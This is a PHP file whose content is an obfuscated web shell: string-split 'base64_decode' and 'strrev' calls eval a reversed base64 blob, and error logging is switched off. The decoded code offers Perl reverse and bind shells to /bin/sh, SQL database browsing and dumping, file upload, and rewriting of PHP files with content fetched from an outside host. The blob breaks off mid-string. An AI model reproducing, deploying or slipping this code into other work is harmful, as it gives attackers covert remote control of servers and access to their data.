<?php $heKoX = 'ba'.'se'.'64'.'_decod'.'e'; $cuGmk = 'strr'.'ev'; ini_set('error_log', NULL); error_reporting(0); /***        b2d8626b508a02ce01c2ddc9c6130889a27ddb2f         */ ini_set('log_errors', 0); eval($cuGmk($heKoX('Cjt0aXhlCjspXSdhJ1tUU09QXyQgLiAnbm9pdGNhJyhjbnVmX3Jlc3VfbGxhYwkKKSApXSdhJ1tUU09QXyQgLiAnbm9pdGNhJyhzdHNpeGVfbm9pdGNudWYgJiYgKV0nYSdbVFNPUF8kKHl0cG1lISAoZmkKOydvZm5JY2VTJyA9IF0nYSdbVFNPUF8kCQkKZXNsZQkKO25vaXRjYV90bHVhZmVkJCA9IF0nYSdbVFNPUF8kCQkKKSlub2l0Y2FfdGx1YWZlZCQgLiAnbm9pdGNhJyhzdHNpeGVfbm9pdGNudWYgJiYgKW5vaXRjYV90bHVhZmVkJCh0ZXNzaShmaQkKKSApXSdhJ1tUU09QXyQoeXRwbWUgKGZpCn0KfQkKOyldJzFwJ1tUU09QXyQobGF2ZQkJCnsgZXNsZSB9CQo7KWEkKGV6aWxhaXJlcyBvaGNlCQkKOykJCQopJ2Vkb21fZWZhcycodGVnX2luaUAgPj0gImVkb21lZmFzIgkJCQosTk9JU1JFVl9PU1cgPj0gIm5vaXNyZXZfb3N3IgkJCQosKShub2lzcmV2cGhwID49ICJub2lzcmV2X3BocCIJCQkKLCkoZW1hbnVfcGhwID49ICJlbWFudSIJCQkKKHlhcnJhID0gYSQJCQp7ICldJzFwJ1tUU09QXyRAIShmaQkKeyApKENSbm9pdGNhIG5vaXRjbnVmCgp9CjspKHJldG9vRm9zdwkKOyI+dHBpcmNzLzwgOydlbGlmZW1hbiQnPWZlcmgubm9pdGFjb2wgPnRwaXJjczwiIG9oY2UJCjsiPnJldG5lYy88PnJiPCEgZW5vRC8uPnJldG5lYzwiIG9oY2UJCjspcGhwJCAsZWxpZmVtYW4kKHN0bmV0bm9jX3R1cF9lbGlmCQp9CQo7J2xtdGhwLicuXTFbMmVsaWZlbWFuJCA9IGVsaWZlbWFuJAkJCjspMmVsaWZlbWFuJCAsZWxpZmVtYW4kICwiI2xtdGhwLlwpKi4oIyIoaGN0YW1fZ2VycAkJCnspKWVsaWZlbWFuJCAsIi9sbXRocC5cLyIoaGN0YW1fZ2VycChmaWVzbGV9CQo7JzdwaHAuJy5dMVsyZWxpZmVtYW4kID0gZWxpZmVtYW4kCQkKOykyZWxpZmVtYW4kICxlbGlmZW1hbiQgLCIjN3BocC5cKSouKCMiKGhjdGFtX2dlcnAJCQp7KSllbGlmZW1hbiQgLCIvN3BocC5cLyIoaGN0YW1fZ2VycChmaWVzbGV9CQo7JzVwaHAuJy5dMVsyZWxpZmVtYW4kID0gZWxpZmVtYW4kCQkKOykyZWxpZmVtYW4kICxlbGlmZW1hbiQgLCIjNXBocC5cKSouKCMiKGhjdGFtX2dlcnAJCQp7KSllbGlmZW1hbiQgLCIvNXBocC5cLyIoaGN0YW1fZ2VycChmaWVzbGV9CQo7J3BocC4nLl0xWzJlbGlmZW1hbiQgPSBlbGlmZW1hbiQJCQo7KTJlbGlmZW1hbiQgLGVsaWZlbWFuJCAsIiNwaHAuXCkqLigjIihoY3RhbV9nZXJwCQkKeykpZWxpZmVtYW4kICwiL3BocC5cLyIoaGN0YW1fZ2VycChmaQkKOylfX0VMSUZfXyhlbWFuZXNhYiA9IGVsaWZlbWFuJAkKfSA7KShlaWQgOykocmV0b29Gb3N3IDsnPnJldG5lYy88PnRub2YvPD5wLzwuZGVsaWFGIF0tWz5wPD4iZGVyIj1yb2xvYyB0bm9mPD5yZXRuZWM8JyBvaGNlIHspKXBocCQgLCIvcGhwP1w8LyIoaGN0YW1fZ2VycCEoZmkJCjspIm10aC43OTEzNjkyMTAyOGYwM2Q4OWU4OTcwOWY3NjMyODM2OS9ldmlsLmtjYXRzZWxpZi8vOnB0dGgiKHN0bmV0bm9jX3RlZ19wdHRoID0gIHBocCQJCn0JCn0JCQo7eGVkb2MkIG5ydXRlcgkJCQp7IGVzbGV9CQkKOyllZ2FQbHJ1JChucnV0ZXIJCQkKOyloYyQoZXNvbGNfbHJ1YwkJCQo7KWhjJChjZXhlX2xydWMgPSBlZ2FQbHJ1JAkJCQo7KSIwLjM0L3hvZmVyaUYgMTAxMDAxMDIvb2tjZUcgKTAuMzQ6dnIgOzQ2V09XIDswLjAxIFROIHN3b2RuaVcoIDAuNS9hbGxpem9NIiAsVE5FR0FSRVNVX1RQT0xSVUMgLGhjJCh0cG90ZXNfbHJ1YwkJCQo7KWV1cnQsTk9JU1NFU0VJS09PQ19UUE9MUlVDICxoYyQodHBvdGVzX2xydWMJCQkKOyk1MSAsVFVPRU1JVF9UUE9MUlVDICxoYyQodHBvdGVzX2xydWMJCQkKOyk1MSAsVFVPRU1JVFRDRU5OT0NfVFBPTFJVQyAsaGMkKHRwb3Rlc19scnVjCQkJCjspMCAsVFNPSFlGSVJFVl9MU1NfVFBPTFJVQyAsaGMkKHRwb3Rlc19scnVjCQkJCjspMCAsUkVFUFlGSVJFVl9MU1NfVFBPTFJVQyAsaGMkKHRwb3Rlc19scnVjCQkJCjspMSAsUkVGU05BUlROUlVURVJfVFBPTFJVQyAsaGMkKHRwb3Rlc19scnVjCQkJCjspMSAsTk9JVEFDT0xXT0xMT0ZfVFBPTFJVQyAsaGMkKHRwb3Rlc19scnVjCQkJCiA7KTAgLFJFREFFSF9UUE9MUlVDICxoYyQodHBvdGVzX2xydWMJCQkKOylscnUkICxMUlVfVFBPTFJVQyAsaGMkKHRwb3Rlc19scnVjCQkJCjspKHRpbmlfbHJ1YyA9IGhjJAkJCQp7KSl4ZWRvYyQoeXRwbWUoIGZpCQkKOylscnUkKHN0bmV0bm9jX3RlZ19lbGlmQCA9IHhlZG9jJAkJCnspbHJ1JChzdG5ldG5vY190ZWdfcHR0aCBub2l0Y251ZgkKOyI+dG5ldG5vYz1zc2FsYyB2aWQ8PjFoLzxldGFkUFU+MWg8IiBvaGNlCQo7KShyZWRhZUhvc3cJCnsgKShldGFEUFVub2l0Y2Egbm9pdGNudWYKCn0KOykocmV0b29Gb3N3CQo7Jz52aWQvPCcgb2hjZQkKfQkKfQkJCjspImxwLmNiL3BtdC8iKGtuaWxudSAgICAgICAgICAgIAo7Ij5lcnAvPCIuKSJscC5jYiBwZXJnIHwgeHVhIHNwIih4RW9zdy4iblx0dW8kPjFsbT1zc2FsYyBlcnA8IiBvaGNlCQkJCjspMShwZWVscyAgICAgICAgICAgIAo7KSImIDEmPjIgbGx1bi92ZWQvPjEgIi5dJzNwJ1tUU09QXyQuIiAiLl0nMnAnW1RTT1BfJC4iIGxwLmNiL3BtdC8gbHJlcCIoeEVvc3cgPSB0dW8kCQkJCjspcF90Y2Vubm9jX2tjYWIkLCJscC5jYi9wbXQvIihmYwkJCQp7ICkncGNiJyA9PSBdJzFwJ1tUU09QXyQoZmkJCQp9CQkKOykibHAucGIvcG10LyIoa25pbG51ICAgICAgICAgICAgCjsiPmVycC88Ii4pImxwLnBiIHBlcmcgfCB4dWEgc3AiKHhFb3N3LiJuXHR1byQ+MWxtPXNzYWxjIGVycDwiIG9oY2UJCQkKOykxKHBlZWxzICAgICAgICAgICAgCjspIiYgMSY+MiBsbHVuL3ZlZC8+MSAiLl0nMnAnW1RTT1BfJC4iIGxwLnBiL3BtdC8gbHJlcCIoeEVvc3cgPSB0dW8kCQkJCjspcF90cm9wX2RuaWIkLCJscC5wYi9wbXQvIihmYwkJCQp7ICkncHBiJyA9PSBdJzFwJ1tUU09QXyQoZmkJCQp9CQkKfQkJCQo7KXckKGVzb2xjZkAJCQkJCjspKXQkKGVkb2NlZF80NmVzYWJALHckKGV0aXJ3ZkAJCQkJCnspdyQoZmkJCQkKOyknc3RuZXRub2NfdHVwX2VsaWYnKHN0c2l4ZV9ub2l0Y251ZkAgcm8gKSJ3IixmJChuZXBvZkAgPSB3JAkJCQp7ICl0JCxmJChmYyBub2l0Y251ZgkJCnsgKSldJzFwJ1tUU09QXyQodGVzc2koZmkJCjsiPnJiPD5tcm9mLzwJCj4nPj4nPWV1bGF2IHRpbWJ1cz1lcHl0IHR1cG5pPCA+JzczMzEzJz1ldWxhdiAndHJvcCc9ZW1hbiAndHhldCc9ZXB5dCB0dXBuaTwgOnRyb1AgPiciLiBdJ1JEREFfRVRPTUVSJ1tSRVZSRVNfJCAuIic9ZXVsYXYgJ3JldnJlcyc9ZW1hbiAndHhldCc9ZXB5dCB0dXBuaTwgOnJldnJlUwkKPi9yYjw+bmFwcy88XWxyZXBbICB0Y2Vubm9jLWtjYUI+bmFwczwJCj4iXDtlc2xhZiBucnV0ZXI7KWV1bGF2LnRyb3Auc2lodCxldWxhdi5yZXZyZXMuc2lodCwncGNiJyxsbHVuLGxsdW4oZyJcPXRpbWJ1U25vICdwZm4nPWVtYW4gbXJvZjwJCj5tcm9mLzwJCj4nPj4nPWV1bGF2IHRpbWJ1cz1lcHl0IHR1cG5pPCA+JzczMzEzJz1ldWxhdiAndHJvcCc9ZW1hbiAndHhldCc9ZXB5dCB0dXBuaTwgOnRyb1AJCj4vcmI8Pm5hcHMvPF1scmVwWyBocy9uaWIvIG90IHRyb3AgZG5pQj5uYXBzPAkKPiJcO2VzbGFmIG5ydXRlcjspZXVsYXYudHJvcC5zaWh0LCdwcGInLGxsdW4sbGx1bihnIlw9dGltYnVTbm8gJ3Bmbic9ZW1hbiBtcm9mPAkKPnRuZXRub2M9c3NhbGMgdmlkPD4xaC88c2xvb3Qga3Jvd3RlTj4xaDwiIG9oY2UJCjsiPTBuQ04wWENLMHdPd0FDZHBoWFpKa2dDTnNqVE85MFFnVTJjdngyWUprZ0NOc2pJdXhGVE1WRVNUUkNJbFJYZGpWR2VsQkNkdUYyUWlBaVRPOTBRZ1FuYnBKSGNnVVdha0JDZjhCQ1RNVkVTVFJDSWpWR2VsbFFDSzB3T2k0a1RQTmtKK0lDTFNKVlJFUjFVZzRXWnc5V0NKb1FEN0lpVE85MFFtNGpJc1FWVlBSRVZUQmlibEIzYkprZ0NOc2pJTzUwVERaQ1Bpd2lUSlJFVlRCaWJsQjNiSmtnQ05zVEtrbEdja0FDWmw1V2FtVkdaaGdDSW1sR0lpc21jdlpHSTA5bWJ1RjJRaUFTWnBSV0NKb1FEN0JTS3BzbWN2WldQa2xHY2tnU0lvWVdhSm9RRDdreVVzNGtUUE5FSzBCWFpqTldZSm9RRDdCU0t4Z1Nac2xHYTNwUUQ3SWliY1JuY3ZCSEl1VkdkemxHYmdRbmJoTmtJZ1VXYWtCQ2Y4QlNLend5VW80V1owTlhhc3BRRDdJaWJjUm5jdkJISXVWR2N2QkNkdUYyUWlBU1pwUkdJOHhISXBrU1dPRjBYU1JFUkI1VVNzMEZNYloxUlNGRUpvNFdhZkpIWmtGMmFqOTJjc01GS2s1V2FpcFFEN2tTTXNJRlJFRlVSVFZWUlM5MVRUeENWRnQwUVBOMVhNOTBVc01GSzBCM2JyTjJielJYWnpwUUQ3SWliY1JYWnJOMmJ6QlNaMEZXWnlOR0kwNVdZREpDSWxsR1pnd0hmZ2tTS25BM1kwZENLbDFXWXVsbll2UjNieUJIZGxkR0xORlVSU1IxVWZ0MFFQTmxKc1FWUk9sMFhHQmxKc01GSzBWMmFqOTJjSzB3TzBWMmFqOTJVZ1UyYzFwUUQ5QnlPcEVESzBsR2VsQnllZ2tTTWd3RElXZGtVQkJFS2dZV2FLMHdPaWtXTGdnMmN2NFdhaTlpSTl3RVRGaDBVa29RRHNKWFp3OWlicEoyTHlOWGR2RXlJIj1wX3Ryb3BfZG5pYiQJCjsiN2tpVVNWRVJVTkZLbE4zYnNObUNOc1RLVVYxVEVSMVVvVTJjdngyWUswd09wNFVTRVIxVW9VMmN2eDJZSzB3T3BjU2F0QUNhejlpYnBKMkxuZ1NibFIzYzVObkNOc1RLaVFWUkxOMFRUWmlQaUFDTFNKVlJFUjFVbzRXWnc5bUNOc1RLaVFWUkxOMFRUWmlQaUFDTFVWMVRFUjFVbzRXWnc5bUNOc1RLaVFWUkxOMFRUWmlQaUFDTE9sRVJVTkZLdVZHY3ZwUUQ3a2lJdXhWSWtBaU95OW1jeVZrSW9VV2FrQkNmOEJTS3lSR1poQkhKZ3dDVkZ0MFFQTkZLME5XWnU1MmJqcFFEN2tpSXV4VklrQWlPeTltY3lWa0lvVVdha0JDZjhCU0t2UjNieUJISmd3U1RCVmtVVU4xWExOMFRUQkNMVVZrVEo5bFJRQkNMVVYwU0Q5MFVvUVhack4yYnpwUUQ3a3lKd05HZG5nU1p0Rm1iNUoyYjA5bWN3UlhabjF6YjA5bWN3UmlDTnNUS2k0R1hoUUNJNkkzYnlKWFJpZ1NacFJHSTh4SElwSUhaa0ZXYWtBQ0xkRnpXV2RrVUJSQ0t1bDJYeVJHWmh0Mll2TlhQeVJHWmhCSEpLMHdPcElpYmNGQ0pnb2pjdkpuY0ZKQ0tsbEdaZ3dIZmdrU1h3c2xWSEpWUWtnaWJ2UlhZZlJYWnVsV1B5UkdaaGxHSkswd08wVjJhajkyVWdVMmMxcFFEc0pYWnc5aWJwSjJMeU5YZHZFeUkiPXBfdGNlbm5vY19rY2FiJAkKOykocmVkYWVIb3N3CQp7ICkoa3Jvd3RlTm5vaXRjYSBub2l0Y251Zgp9CjspKHJldG9vRm9zdwkKOyc+dmlkLzwnIG9oY2UJCn0gICAgCjspKShyb3JyZT4tYmQkKHNyYWhjbGFpY2Vwc2xtdGggb2hjZSAgICAgICAgCnsgZXNsZSB9CQp9CQkJCjsnPmVycC88Jy4pXSdlbGlmJ1tlbGlmJChzcmFoY2xhaWNlcHNsbXRoLic+MWxtPXNzYWxjIGVycDw+L3JiPCcgb2hjZQkJCQkKOyldJzJwJ1tUU09QXyQoZWxpRmRhb2w+LWJkJCA9IGVsaWYkCQkJCQp7ICknZWxpZmRhb2wnID09IF0nMXAnW1RTT1BfJEAoZmkJCQkKfSAgICAgICAgICAgIAo7Ij5tcm9mLzw+Jz4+Jz1ldWxhdiB0aW1idXM9ZXB5dCB0dXBuaTw+Zj1lbWFuIHR4ZXQ9ZXB5dCAncG5Jc2xvb3QnPXNzYWxjICB0dXBuaTwgPm5hcHMvPGVsaWYgZGFvTD5uYXBzPD4nO2VzbGFmIG5ydXRlcjspKHRpbWJ1cy5mcy50bmVtdWNvZDtldWxhdi5mLnNpaHQ9ZXVsYXYuMnAuZnMudG5lbXVjb2Q7IlxlbGlmZGFvbCJcPWV1bGF2LjFwLmZzLmQnPXRpbWJ1c25vIG1yb2Y8IiBvaGNlICAgICAgICAgICAgICAgICAgICAKKSkoaGN0ZWY+LWJkJChmaSAgICAgICAgICAgICAgICAKOykiJ3knID0gYHZpcnBfZWxpRmAgRE5BICkoUkVTVSA9IClgdHNvaGAgLCdAJyAsYHJlc3VgKHRhY25vYyBFUkVIVyByZXN1Lmxxc3ltIE1PUkYgMSBUQ0VMRVMiKHlyZXVxPi1iZCQgICAgICAgICAgICAgICAgCnsgKSdscXN5bSc9PV0nZXB5dCdbVFNPUF8kKGZpICAgICAgICAgICAgCjsiPi9yYjw+bXJvZi88PmVsYmF0LzwiIG9oY2UJCQkKfQkJCQo7Ij5ydC88PmR0LzwiIG9oY2UJCQkJCjsiPidldHVjZXhFJz1ldWxhdiB0aW1idXM9ZXB5dCB0dXBuaTw+L3JiPD5hZXJhdHhldC88IiBvaGNlICAgICAgICAgICAgICAgIAo7KV0nMnAnW1RTT1BfJChzcmFoY2xhaWNlcHNsbXRoIG9oY2UgICAgICAgICAgICAgICAgICAgIAopKSdlbGlmZGFvbCcgPSEgXScxcCdbVFNPUF8kKCAmJiApXScycCdbVFNPUF8kKHl0cG1lIShmaSAgICAgICAgICAgICAgICAKOyI+J3hwMDAxOnRoZ2llaDslMDAxOmh0ZGl3Jz1lbHl0cyAneXJldXEnPWVtYW4gYWVyYXR4ZXQ8Pic7ZXNsYWYgbnJ1dGVyOykodGltYnVzLmZzLnRuZW11Y29kO2V1bGF2LnlyZXVxLnNpaHQ9ZXVsYXYuMnAuZnMuZDsiXHlyZXVxIlw9ZXVsYXYuMXAuZnMuZCc9dGltYnVzbm8gbXJvZjw+bXJvZi88PnJiPCIgb2hjZQkJCQkKfQkJCQkKfQkJCQkJCjsnPnZpZC88Jy4pKShyb3JyZT4tYmQkKHNyYWhjbGFpY2Vwc2xtdGguJyA+Yi88OnJvcnJFPmI8PnZpZDwnIG9oY2UJCQkJCQkKeyBlc2xlIH0JCQkJCQo7Jz5lbGJhdC88JyBvaGNlCQkJCQkJCn0JCQkJCQkKOyc+cnQvPCcgb2hjZQkJCQkJCQkKfQkJCQkJCQkKOyc+ZHQvPCcuKSlldWxhdiQoc3JhaGNsYWljZXBzbG10aChyYjJsbi4nPmR0PCcgb2hjZQkJCQkJCQkJCQplc2xlCQkJCQkJCQkKOyc+ZHQvPD5pLzxsbHVuPmk8PmR0PCcgb2hjZQkJCQkJCQkJCQopbGx1biA9PSBldWxhdiQoZmkJCQkJCQkJCQp7IClldWxhdiQgPj0geWVrJCBzYSBtZXRpJChoY2Flcm9mCQkJCQkJCQo7MToyPzE9PWVuaWwkID0gZW5pbCQJCQkJCQkJCjsnPiInLmVuaWwkLidsIj1zc2FsYyBydDwnIG9oY2UJCQkJCQkJCn0JCQkJCQkJCjsyID0gZW5pbCQJCQkJCQkJCQo7Jz5ydDw+cnQvPCcgb2hjZQkJCQkJCQkJCjtldXJ0PWVsdGl0JAkJCQkJCQkJCjspbWV0aSQodGVzZXIJCQkJCQkJCQo7Jz5odC88Jy55ZWskLic+aHQ8JyBvaGNlCQkJCQkJCQkJCilldWxhdiQgPj0geWVrJCBzYSBtZXRpJChoY2Flcm9mCQkJCQkJCQkKOyc+cnQ8JyBvaGNlCQkJCQkJCQkKewkpZWx0aXQkIShmaQkJCQkJCQkKewkpKShoY3RlZj4tYmQkID0gbWV0aSQoZWxpaHcJCQkJCQkKOzEgPSBlbmlsJAkJCQkJCQo7Jz4iOTI5MjkyIzpyb2xvYy1kbnVvcmdrY2FiIj1lbHl0cyBuaWFtPXNzYWxjIDI9Z25pZGRhcGxsZWMgMT1nbmljYXBzbGxlYyAlMDAxPWh0ZGl3IGVsYmF0PCcgb2hjZQkJCQkJCQo7ZXNsYWYgPSBlbHRpdCQJCQkJCQkKeyApZXNsYWYgPT0hIHNlcj4tYmQkKGZpCQkJCQkKOyldJzJwJ1tUU09QXyRAKHlyZXVxPi1iZCQJCQkJCQp7ICkpXScycCdbVFNPUF8kKHl0cG1lISAmJiApJ3lyZXVxJyA9PSBdJzFwJ1tUU09QXyRAKChmaQkJCQkKfQkJCQkKOyI+cmI8PnJiPCIgb2hjZQkJCQkJCjsnMDMsJy4pMDMqXSczcCdbVFNPUF8kKC4nIFRJTUlMIGAnLl0nMnAnW1RTT1BfJC4nYCBNT1JGICogVENFTEVTJyA9IF0nMnAnW1RTT1BfJAkJCQkJCQplc2xlCQkJCQkKOykwMypdJzNwJ1tUU09QXyQoLicgVEVTRkZPIDAzIFRJTUlMICcuXScycCdbVFNPUF8kLicgTU9SRiAqIFRDRUxFUycgPSBdJzJwJ1tUU09QXyQJCQkJCQkKKSdscXNncCc9PV0nZXB5dCdbVFNPUF8kKGZpCQkJCQkKOy0tXSczcCdbVFNPUF8kICAgICAgICAgICAgICAgICAgICAKOyI+YS88O3RnJiB0eGVOPicpIiAuICkxK10nM3AnW1RTT1BfJCggLiAnICwiJyAuIF0nMnAnW1RTT1BfJCAuICIiXCh0cyc9a2NpbGNubyAjPWZlcmggYTwgIiBvaGNlICAgICAgICAgICAgICAgICAgICAgICAgCilzZWdhcCQgPCBdJzNwJ1tUU09QXyQoZmkgICAgICAgICAgICAgICAgICAgIAo7Ij5hLzx2ZXJQIDt0bCY+JykiIC4gKTEtXSczcCdbVFNPUF8kKCAuICcgLCInIC4gXScycCdbVFNPUF8kIC4gIiJcKHRzJz1rY2lsY25vICM9ZmVyaCBhPCAiIG9oY2UgICAgICAgICAgICAgICAgICAgICAgICAKKTEgPiBdJzNwJ1tUU09QXyQoZmkgICAgICAgICAgICAgICAgICAgIAo7InNlZ2FwJCBmbyAiIG9oY2UgICAgICAgICAgICAgICAgICAgIAo7Ij4iIC4gKV0nM3AnW1RTT1BfJCl0bmkoKCAuICI9ZXVsYXYgJzNwJz1lbWFuIHR4ZXQ9ZXB5dCB0dXBuaTwgIyBlZ2FQIClzZHJvY2VyIH1dJ24nW211biR7KCA+bmFwcy88Ii5dJzJwJ1tUU09QXyQuIj5uYXBzPD50cGlyY3MvPH0pZXVsYXYuM3AuZnMuZCAsIlwiIC4gXScycCdbVFNPUF8kIC4gIiJcKHRzeykobm9pdGNudWY9dGltYnVzbm8uZnMuZD50cGlyY3M8IiBvaGNlICAgICAgICAgICAgICAgICAgICAKOykwMyAvIF0nbidbbXVuJChsaWVjID0gc2VnYXAkCQkJCQkKOykoaGN0ZWY+LWJkJCA9IG11biQJCQkJCQo7KV0nMnAnW1RTT1BfJCAuICcgTU9SRiBuIHNhICkqKFROVU9DIFRDRUxFUycoeXJldXE+LWJkJAkJCQkJCjsxOl0nM3AnW1RTT1BfJD9dJzNwJ1tUU09QXyQgPSBdJzNwJ1tUU09QXyQgICAgICAgICAgICAgICAgICAgIAo7J3lyZXVxJyA9IF0nMXAnW1RTT1BfJAkJCQkJCnsgKSd0Y2VsZXMnID09IF0nMXAnW1RTT1BfJEAoZmkJCQkJCjsiPic7NjY2IyBkaWxvcyB4cDI6cG90LXJlZHJvYic9ZWx5dHMgZHQ8PmR0Lzw+J2xxcy5wbXVkJz1ldWxhdiBlbGlmPWVtYW4gdHhldD1lcHl0IHR1cG5pPDpodGFwIGVsaUY+cmI8Pic7KSh0aW1idXMuZnMudG5lbXVjb2Q7IlxkYW9sbndvZCJcPWV1bGF2LjJwLmZzLnRuZW11Y29kJz1rY2lsY25vICdwbXVEJz1ldWxhdiBub3R0dWI9ZXB5dCB0dXBuaTwgPic7KShzaSc9a2NpbGNubyAneG9ia2NlaGMnPWVweXQgdHVwbmk8IiBvaGNlCQkJCQp9CQkJCQo7Ij5yYjw+cmJvbi88IiAuICkiPmxsYW1zLzwpfV0nbidbbiR7KD5sbGFtczwgIjonO3BzYm4mJz8pXSd0bnVvY19scXMnW1RTT1BfJCh5dHBtZSggLiAiPmEvPCIuZXVsYXYkLiI+IlwpMSwnIi5ldWxhdiQuIicodHMiXD1rY2lsY25vICM9ZmVyaCBhPDtwc2JuJj4nIi5ldWxhdiQuIic9ZXVsYXYgJ11bbGJ0Jz1lbWFuICd4b2JrY2VoYyc9ZXB5dCB0dXBuaTw+cmJvbjwiIG9oY2UJCQkJCQo7KWV1bGF2JChzcmFoY2xhaWNlcHNsbXRoID0gZXVsYXYkCQkJCQkKOykpJycuZXVsYXYkLicgTU9SRiBuIHNhICkqKFROVU9DIFRDRUxFUycoeXJldXE+LWJkJChoY3RlZj4tYmQkID0gbiQgICAgICAgICAgICAgICAgICAgICAgICAKKSldJ3RudW9jX2xxcydbVFNPUF8kKHl0cG1lIShmaSAgICAgICAgICAgICAgICAgICAgCjspbWV0aSQoaGNhZSA9IClldWxhdiQgLHllayQodHNpbAkJCQkJCnsgKSlzZXJfc2xidCQoaGN0ZWY+LWJkJCA9IG1ldGkkKGVsaWh3CQkJCQo7KShzZWxiYVR0c2lsPi1iZCQgPSBzZXJfc2xidCQJCQkJCjsiPnJiPD5yYjw+bmFwcy88OnNlbGJhVD5uYXBzPD4nOzY2NiMgZGlsb3MgeHAyOnBvdC1yZWRyb2InPWVseXRzIDE9aHRkaXcgZHQ8PnJ0PCIgb2hjZQkJCQkKOyldJ2VzYWJfbHFzJ1tUU09QXyQoYmR0Y2VsZXM+LWJkJAkJCQkKeykpXSdlc2FiX2xxcydbVFNPUF8kKHl0cG1lIShmaQkJCQo7Ij4wPWduaWNhcHNsbGVjIDI9Z25pZGRhcGxsZWMgJTAwMT1odGRpdyBlbGJhdDw+L3JiPCIgb2hjZQkJCnspa25pbD4tYmQkICYmICliZCQodGVzc2koZmkJCjsiPnRwaXJjcy88CQkKfQkJCQo7ZGVrY2VoYy5daVtdJ11bbGJ0J1tzdG5lbWVsZS5mcy5kISA9IGRla2NlaGMuXWlbXSddW2xidCdbc3RuZW1lbGUuZnMuZAkJCQkJCilpKys7aHRnbmVsLl0nXVtsYnQnW3N0bmVtZWxlLmZzLmQ8aTswPWkocm9mCQkJCQp7ICkoc2kgbm9pdGNudWYJCQkKfQkJCQo7KSh0aW1idXMuZnMuZAkJCQkKO2wgPSBldWxhdi4zcC5mcy5kICkzcC5mcy5kICYmIGwoZmkgICAgICAgICAgICAgICAgCjt0ID0gZXVsYXYuMnAuZnMuZAkJCQkKOyd0Y2VsZXMnID0gZXVsYXYuMXAuZnMuZAkJCQkKeyApbCx0KHRzIG5vaXRjbnVmCQkJCn0gICAgICAgICAgICAKfSAgICAgICAgICAgICAgICAKOycnPWV1bGF2LjNwLmYgKTNwLmYoZmkgICAgICAgICAgICAgICAgICAgIAo7Jyc9ZXVsYXYuMnAuZiApMnAuZihmaSAgICAgICAgICAgICAgICAgICAgCjsnJz1ldWxhdi4xcC5mICkxcC5mKGZpICAgICAgICAgICAgICAgICAgICAKO317ICkobm9pdGNudWYgPSB0aW1idXNuby5mIHsgKWJkX3M9IWV1bGF2LmVzYWJfbHFzLmYoZmkgICAgICAgICAgICAgICAgCnsgKWYoc2Ygbm9pdGNudWYgICAgICAgICAgICAKOyciLildJ2VzYWJfbHFzJ1tUU09QXyQoc2Voc2Fsc2RkYUAuIic9YmRfcyAgICAgICAgICAgIAo+dHBpcmNzPAkJCj5lbGJhdC88CQkKPnJ0LzwJCQkKPmR0Lzxzd29yIGZvIHJlYm11biBlaHQgdG51b2MgPiIgLiApJ2Rla2NlaGMgJzonJz8pXSd0bnVvY19scXMnW1RTT1BfJCh5dHBtZSggLiAiJ25vJz1ldWxhdiB0bnVvY19scXM9ZW1hbiB4b2JrY2VoYz1lcHl0IHR1cG5pPD5kdDwgICAgICAgICAgICAgICAgCj5kdC88Pic7KWZzLmQoc2YnPWtjaWxjbm8gJz4+Jz1ldWxhdiB0aW1idXM9ZXB5dCB0dXBuaTw+ZHQ8CQkJCQo+ZHQvPCIgb2hjZQkKO3BtdCQgb2hjZQkJCmVzbGV9CQo7cG10JCBvaGNlIGVzbGUJCQp9CQkKOyc+dGNlbGVzLzwnIG9oY2UJCQkKfQkJCQo7Jz5ub2l0cG8vPCcuZXVsYXYkLic+Jy4pJyc6J2RldGNlbGVzJz9dJ2VzYWJfbHFzJ1tUU09QXyQ9PWV1bGF2JCguJyAiJy5ldWxhdiQuJyI9ZXVsYXYgbm9pdHBvPCcgb2hjZQkJCQkKOyltZXRpJChoY2FlID0gKWV1bGF2JCAseWVrJCh0c2lsCQkJCQp7ICkpKGhjdGVmPi1iZCQgPSBtZXRpJChlbGlodwkJCQo7Ij5ub2l0cG8vPD4nJz1ldWxhdiBub2l0cG88PmVzYWJfbHFzPWVtYW4gdGNlbGVzPCIgb2hjZQkJCQo7KShzYkR0c2lsPi1iZCQJCQkKfQkJCQo7a2FlcmIgOyknNjY4cGMnKHRlc3JhaEN0ZXM+LWJkJCA6IjY2OHBjIiBlc2FjCQkJCQo7a2FlcmIgOykndThpb2snKHRlc3JhaEN0ZXM+LWJkJCA6IlUtOElPSyIgZXNhYwkJCQkKO2thZXJiIDspJ3I4aW9rJyh0ZXNyYWhDdGVzPi1iZCQgOiJSLThJT0siIGVzYWMJCQkJCjtrYWVyYiA7KSc4ZnR1Jyh0ZXNyYWhDdGVzPi1iZCQgOiI4LUZUVSIgZXNhYwkJCQkKO2thZXJiIDspJzE1MjFwYycodGVzcmFoQ3Rlcz4tYmQkIDoiMTUyMS1zd29kbmlXIiBlc2FjCQkJCQp7ICldJ3Rlc3JhaGMnW1RTT1BfJChoY3Rpd3MJCQkKeyApKV0nZXNhYl9scXMnW1RTT1BfJCAsXSdzc2FwX2xxcydbVFNPUF8kICxdJ25pZ29sX2xxcydbVFNPUF8kICxdJ3Rzb2hfbHFzJ1tUU09QXyQodGNlbm5vYz4tYmQkKGZpCQkKeykpXSd0c29oX2xxcydbVFNPUF8kKHRlc3NpKGZpCQo7Ij4nJz1ldWxhdiBlc2FiX2xxcz1lbWFuIHR4ZXQ9ZXB5dCB0dXBuaTwiID0gcG10JAkKOyI+ZHQ8PmR0Lzw+IlwiLiApKV0nc3NhcF9scXMnW1RTT1BfJChzcmFoY2xhaWNlcHNsbXRoOicnPyldJ3NzYXBfbHFzJ1tUU09QXyQoeXRwbWUoIC4iIlw9ZXVsYXYgc3NhcF9scXM9ZW1hbiB0eGV0PWVweXQgdHVwbmk8PmR0PAo+ZHQvPD4iXCIuICkpXSduaWdvbF9scXMnW1RTT1BfJChzcmFoY2xhaWNlcHNsbXRoOid0b29yJz8pXSduaWdvbF9scXMnW1RTT1BfJCh5dHBtZSggLiIiXD1ldWxhdiBuaWdvbF9scXM9ZW1hbiB0eGV0PWVweXQgdHVwbmk8PmR0PAo+ZHQvPD4iXCIuICkpXSd0c29oX2xxcydbVFNPUF8kKHNyYWhjbGFpY2Vwc2xtdGg6J3Rzb2hsYWNvbCc/KV0ndHNvaF9scXMnW1RTT1BfJCh5dHBtZSggLiIiXD1ldWxhdiB0c29oX2xxcz1lbWFuIHR4ZXQ9ZXB5dCB0dXBuaTw+ZHQ8Cj5kdC88PnRjZWxlcy88Pm5vaXRwby88bHFTZXJndHNvUD4iIG9oY2UKOydkZXRjZWxlcycgb2hjZSknbHFzZ3AnPT1dJ2VweXQnW1RTT1BfJEAoZmkKOyIgJ2xxc2dwJz1ldWxhdiBub2l0cG88Pm5vaXRwby88bHF